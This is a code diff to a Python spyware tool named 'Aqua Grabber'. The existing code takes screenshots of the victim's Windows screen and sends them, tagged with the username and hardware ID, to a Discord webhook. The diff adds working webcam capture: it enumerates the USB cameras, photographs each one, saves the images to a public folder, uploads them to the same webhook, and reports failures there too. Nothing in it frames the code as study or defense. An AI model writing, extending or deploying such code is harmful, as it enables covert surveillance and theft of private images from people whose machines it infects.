@@ -4,6 +4,8 @@ import shutil
 import glob
 import subprocess
 
+import cv2
+import win32com.client
 from PIL import Image
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from mss import mss
@@ -44,9 +46,10 @@ def takeSS():
         file_data = f.read()
     webhook.content = f'```{user} | ScreenShot | HWID: {get_HWID()}```'
     webhook.add_file(file_data, f'Aqua_{user}_SS.gif')
-    print("Done")
+    print("Done Taking ScreenShots")
     webhook.execute()
     webhook.remove_files()
+
 
 def getCam():
     try:
@@ -54,7 +57,6 @@ def getCam():
         wmi = win32com.client.GetObject("winmgmts:")
         for usb in wmi.InstancesOf("Win32_USBHub"):
             if str(usb.DeviceID).startswith("USB\VID"):
-                print(test)
                 test = test + 1
             else:
                 pass
@@ -66,15 +68,23 @@ def getCam():
                     cv2.imwrite(f'C:/Users/Public/Aqua/Cam/{str(x)}.png', image)
                     print(f"Webcam[{x}] Done Pic " + str(i))
                 del camera
-                webhook.content = f'```{user} | Webcam Number {x} | HWID: {get_id()}```'
-                webhook.add_file(file_data, f'Aqua_{user}_Cam_{x}.gif')
+                webhook.content = f'```{user} | Webcam Number {x} | HWID: {get_HWID()}```'
+                with open(f'C:/Users/Public/Aqua/Cam/{x}.png', 'rb') as f:
+                    file_data = f.read()
+                webhook.add_file(file_data, f'Aqua_{user}_Cam_{x}.png')
                 print(f"Done Grabbing Webcam Numb {x}")
                 webhook.execute()
                 webhook.remove_files()
             except:
-
+                webhook.content = f'```{user} | Failed To Grab Webcam {x} | HWID: {get_HWID()}```'
+                print(f"Failed Webcam Numb {x}")
+                webhook.execute()
+                webhook.remove_files()
     except:
-
+        webhook.content = f'```{user} | Webcam Grab Unknown Error | HWID: {get_HWID()}```'
+        print(f"Unknown Error")
+        webhook.execute()
+        webhook.remove_files()
 
 
 # Clean Up
@@ -91,6 +101,7 @@ webhook.username = "Aqua Grabber"
 def runAqua():
     makeDir()
     takeSS()
+    getCam()
     cleanUp()
 
 
